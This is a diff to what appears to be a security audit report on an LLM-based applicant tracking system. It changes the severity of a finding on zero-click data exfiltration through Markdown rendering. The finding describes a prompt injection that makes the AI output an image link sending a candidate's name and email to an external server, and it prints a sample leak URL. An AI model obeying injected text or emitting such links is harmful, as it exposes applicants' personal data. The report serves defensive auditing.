@@ -28,7 +28,7 @@ The EcoMada ATS utilizes an LLM to automatically analyze resumes and send emails
 - **Remediation:** The RAG knowledge base must be strictly read-only and protected by strong access controls. The AI should be instructed to never execute operational commands (like sending emails) based solely on text from a knowledge base.
 
 ## Finding 3: Zero-Click Data Exfiltration via Markdown
-- **Severity:** High
+- **Severity:** Critical
 - **OWASP Mapping:** LLM02 (Sensitive Information Disclosure)
 - **Description:** The frontend renders the LLM's output as standard Markdown without sanitizing URLs.
 - **Exploit:** The attacker injected a payload forcing the AI to generate a Markdown image link pointing to an external server, dynamically inserting the candidate's PII (`![Audit](http://localhost:8000/leak?nom=Dupont&email=test@att.com)`).
